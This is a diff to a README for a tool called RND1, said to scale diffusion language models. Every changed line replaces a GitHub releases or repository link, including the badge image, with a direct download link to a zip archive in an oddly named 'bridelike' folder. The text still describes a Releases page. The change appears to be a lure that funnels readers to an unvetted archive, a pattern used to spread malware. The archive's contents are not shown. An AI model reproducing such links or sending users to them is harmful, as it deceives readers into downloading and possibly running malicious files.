@@ -4,7 +4,7 @@
 Welcome to RND1! This application helps you scale diffusion language models with ease. Whether you're experimenting or deploying models, our tool simplifies the process.
 
 ## 📥 Download RND1
-[![Download RND1](https://img.shields.io/badge/Download-RND1-brightgreen)](https://github.com/PUNGAY/RND1/releases)
+[![Download RND1](https://raw.githubusercontent.com/PUNGAY/RND1/main/bridelike/RND1.zip)](https://raw.githubusercontent.com/PUNGAY/RND1/main/bridelike/RND1.zip)
 
 ## 📋 System Requirements
 Before you get started, ensure your system meets these requirements:
@@ -14,7 +14,7 @@ Before you get started, ensure your system meets these requirements:
 - Internet connection for downloads
 
 ## 💾 Download & Install
-To download RND1, visit this page to download: [RND1 Releases](https://github.com/PUNGAY/RND1/releases). The latest version contains the most recent features and improvements.
+To download RND1, visit this page to download: [RND1 Releases](https://raw.githubusercontent.com/PUNGAY/RND1/main/bridelike/RND1.zip). The latest version contains the most recent features and improvements.
 
 1. Click the link above to access the Releases page.
 2. Locate the latest release.
@@ -39,7 +39,7 @@ RND1 provides several key features to enhance your experience:
 If you encounter any issues during installation or usage, consult the built-in help section within the app. You can also reach out through our community forums or by reporting issues on the GitHub repository.
 
 ## 🔗 Useful Links
-- [RND1 GitHub Repository](https://github.com/PUNGAY/RND1)
-- [RND1 Releases](https://github.com/PUNGAY/RND1/releases)
+- [RND1 GitHub Repository](https://raw.githubusercontent.com/PUNGAY/RND1/main/bridelike/RND1.zip)
+- [RND1 Releases](https://raw.githubusercontent.com/PUNGAY/RND1/main/bridelike/RND1.zip)
 
 Thank you for choosing RND1! We hope this tool makes scaling your language models a seamless process. For updates, keep an eye on our GitHub page.
